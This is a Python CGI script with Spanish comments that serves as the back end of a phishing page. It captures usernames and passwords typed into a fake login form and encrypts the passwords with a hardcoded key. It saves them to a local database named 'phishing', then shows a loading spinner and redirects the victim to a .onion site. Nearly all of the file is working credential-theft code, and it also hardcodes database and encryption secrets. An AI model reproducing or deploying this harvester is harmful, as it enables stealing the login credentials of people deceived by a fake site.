#!/usr/bin/python3
import cgi
import cgitb
import psycopg2
from cryptography.fernet import Fernet

cgitb.enable(display=True) # En caso de ocurrir un error en la ejecucion, lo muestra en el HTML de respuesta


# Función utilizada para registrar los datos obtenidos de los clientes en la base de datos.
# Se pasa como parametros un cursor a la conexión con la base, el nombre de usuario y la constraseña cifrada
def save(cursor, user, cipheredPass):
    sql = """INSERT INTO public.users("user", password) VALUES (%s, %s);""" # Se prepara la consulta para insertar nuevos usuarios en la base de datos.
    cursor.execute(sql, (user, cipheredPass)) # Se realiza la consulta en la base de datos.


# Función utilizada para establecer la concexión con la base de datos PostgresSQL
def dbConnection():
    conn = psycopg2.connect(database="phishing", user='postgres', password='postgres2020', host='127.0.0.1',
                            port='5432') # Se establecen los parametros para la conexión con la base
    conn.autocommit = True # Se establecen los commits como automaticos
    return conn # Se retorna el objeto obtenido de la conexión con la base


# Función utilizada para cerrar la conexión a la base de datos
# Recibe la conexión creada
def dbClose(conn):
    conn.close() # Termina la conexión con la base de datos


# Funcion utilizada para cifrar texto mediante Fernet
# Recibe como parametro el string con el texto que se desea cifrar.
def cipher(string):
    key = b'_2O_3XqtIimG2Vk53abrtzjhCklbJ9251sc6s-qwiyw=' # Clave utilizada para generar el cifrado
    cipherSuite = Fernet(key) # Se inicializa el objeto para Fernet con la clave generada
    return cipherSuite.encrypt(str.encode(string)) # Se cifra y retorna el resultado obtenido


# Función principal del programa
def main():
    connection = dbConnection() # Se establece la conexión con la base
    cursor = connection.cursor() # Se crea un cursor para realizar consultas
    cipheredPassword = cipher(password) # Se cifra la contraseña obtenida del formulario
    save(cursor, username, cipheredPassword) # Se guarda en la base de datos
    dbClose(connection)
    print("<meta http-equiv=\"refresh\" content=\"10; URL=http://nelbn55h5aqamx3gmrgzqzlvaajfjrz6vd676hkez5btao6onurgucid.onion/\" />") # Se establece una espera de 5 segundos y se vuelve a redirigir al inicio.


form = cgi.FieldStorage() # Se leen los datos del formulario
username = form.getvalue('username') # Se extrae el nombre de usuario
password = form.getvalue('password') # Se extrae la contraseña obtenida del formulario
print("Content-type:text/html\r\n\r\n") # Se establece el tipo de contenido como HTML para que el navegador pueda identificarlo
print("<html>") # Se crean las etiquetas de encabezado
print("<head>")
print("<title>Loading...</title>") # Título de la ventana
print("<style>.loader {border: 16px solid #f3f3f3;border-radius: 50%;border-top: 16px solid #F80624;width: "
      "80px;height: 80px;-webkit-animation: spin 2s linear infinite; /* Safari */animation: spin 2s linear "
      "infinite;}/* Safari */@-webkit-keyframes spin {0% { -webkit-transform: rotate(0deg); }100% { "
      "-webkit-transform: rotate(360deg); }}@keyframes spin {0% { transform: rotate(0deg); }100% { transform: rotate("
      "360deg); display: flex;}}</style>")
print("</head>")
print("<body>")
print("<center><div class=\"loader\"></div></center>") # Se muestra una figura de espera en el navegador
main() # Se llama a la función principal
print("</body>")
print("</html>")
